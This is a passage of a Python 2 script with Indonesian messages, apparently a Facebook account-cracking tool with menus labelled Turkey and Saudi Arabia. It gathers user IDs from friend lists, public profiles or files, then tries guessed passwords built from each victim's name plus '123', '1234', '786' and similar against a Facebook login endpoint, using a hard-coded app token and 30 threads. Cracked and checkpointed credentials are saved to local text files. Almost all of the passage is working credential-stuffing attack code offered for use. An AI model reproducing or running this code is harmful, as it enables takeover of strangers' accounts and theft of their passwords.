		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print " "
		print "\033[1;91m _________   ________.    "
		print "\033[1;91m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;91m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;91m  \______  /|__|   |___  /"
		print "\033[1;91m         \/            \/ "
		try:
			print 50* "\033[1;94m─"
			print ("              \033[1;94m>>> \033[1;93mCRACK TURKY \033[1;94m<<<")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mNama File\033[1;91m :\033[1;97m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada ! '
			raw_input('\n\033[1;97m(\033[1;91mKembali \033[1;97m)')
		except IOError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada !'
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_turkey()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_turkey()
	
	print "\033[0;97m(\033[0;94m•\033[0;97m) Total ID\033[1;91m  :\033[1;97m "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m(\033[0;94m•\033[0;97m) Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print "\033[0;97m(\033[0;94m•\033[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\033[0m"
	print "\033[0;97m(\033[0;94m•\033[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\033[0m"
	print 50* "\033[1;94m─"
	
##### MAIN TURKEY #####
	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;97m%H\033[1;97m:\033[1;97m%M\033[1;97m:\033[1;97m%S")));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
				oke = open("done/turkey.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
					cek = open("done/turkey.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
						oke = open("done/turkey.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
							cek = open("done/turkey.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
								oke = open("done/turkey.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
									cek = open("done/turkey.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = j['first_name'].lower()+'786'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
										oke = open("done/turkey.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
											cek = open("done/turkey.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = j['first_name'].lower()+'123'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
												oke = open("done/turkey.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
													cek = open("done/turkey.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['first_name'].lower()+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
														oke = open("done/turkey.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
															cek = open("done/turkey.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = ('123456')
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																oke = open("done/turkey.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																	cek = open("done/turkey.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'1234'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																		oke = open("done/turkey.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																			cek = open("done/turkey.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSelesai ...'
	print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSalin hasil crack lalu simpan\033[1;91m : \033[1;97mdone turki.'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m(\033[1;91mKembali\033[1;97m) ")
	os.system("python2 Crack.py")
	
	
	##### CRACK Arab #####
def crack_saudi():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print " "
	print "\033[1;97m _________ \033[1;92m   ________.    "
	print "\033[1;97m \_   ___ \ \033[1;92m_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
	print "\033[1;97m /    \  \/ \033[1;92m\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
	print "\033[1;97m \     \____ \033[1;92m|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
	print "\033[1;97m  \______  / \033[1;92m|__|   |___  /"
	print "\033[1;97m         \/      \033[1;92m       \/ "
	print 50* "\033[1;94m─"
	print "\033[1;94m──────────────────\033[1;97m(\033[1;93mSaudi Arabia\033[1;97m)\033[1;94m──────────────────"
	print 50* "\033[1;94m─"
	print "\033[1;94m(\033[1;97m1\033[1;94m) \033[1;97mCrack Dari Daftar Teman"
	print "\033[1;94m(\033[1;97m2\033[1;94m)\033[1;97m Crack Dari Id Teman/Publik"
	print "\033[1;94m(\033[1;97m3\033[1;94m)\033[1;97m Crack Dari File"
	print "\033[1;94m(\033[1;91m0\033[1;94m) \033[1;97mKembali"
	print 50* "\033[1;94m─"
	pilih_saudi()

#### PILIH Arab ####
def pilih_saudi():
	teak = raw_input("\033[1;97m(?) Pilih \033[94m> \033[1;97m ")
	if teak =="":
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_saudi()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print " "
		print "\033[1;97m _________ \033[1;92m   ________.    "
		print "\033[1;97m \_   ___ \ \033[1;92m_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;97m /    \  \/ \033[1;92m\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;97m \     \____ \033[1;92m|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;97m  \______  / \033[1;92m|__|   |___  /"
		print "\033[1;97m         \/      \033[1;92m       \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK SAUDI ARABIA \033[1;94m<<<")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print " "
		print "\033[1;97m _________ \033[1;92m   ________.    "
		print "\033[1;97m \_   ___ \ \033[1;92m_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;97m /    \  \/ \033[1;92m\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;97m \     \____ \033[1;92m|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;97m  \______  / \033[1;92m|__|   |___  /"
		print "\033[1;97m         \/      \033[1;92m       \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK SAUDI ARABIA \033[1;94m<<<")
		print 50* "\033[1;94m─"
		idt = raw_input("\033[1;97m(\033[1;94m•\033[1;97m) ID Publik \033[1;91m:\033[1;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m(\033[1;94m•\033[1;97m) Nama Akun \033[1;91m:\033[1;97m "+sp["name"]
		except KeyError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) ID publik Tidak Ada!"
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_saudi()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print " "
		print "\033[1;97m _________ \033[1;92m   ________.    "
		print "\033[1;97m \_   ___ \ \033[1;92m_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;97m /    \  \/ \033[1;92m\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;97m \     \____ \033[1;92m|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;97m  \______  / \033[1;92m|__|   |___  /"
		print "\033[1;97m         \/      \033[1;92m       \/ "
		try:
			print 50* "\033[1;94m─"
			print ("             \033[1;94m>>> \033[1;93mCRACK SAUDI ARABIA \033[1;94m<<<")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mNama File\033[1;91m :\033[1;97m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada ! '
			raw_input('\n\033[1;97m(\033[1;91mKembali \033[1;97m)')
		except IOError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada !'
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_saudi()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_saudi()
	
	print "\033[0;97m(\033[0;94m•\033[0;97m) Total ID\033[1;91m  :\033[1;97m "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m(\033[0;94m•\033[0;97m) Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print "\033[0;97m(\033[0;94m•\033[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\033[0m"
	print "\033[0;97m(\033[0;94m•\033[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\033[0m"
	print 50* "\033[1;94m─"
	
##### MAIN Arab #####
	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;97m%H\033[1;97m:\033[1;97m%M\033[1;97m:\033[1;97m%S")));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
				oke = open("done/saudi.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
					cek = open("done/saudi.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
						oke = open("done/saudi.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
							cek = open("done/saudi.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
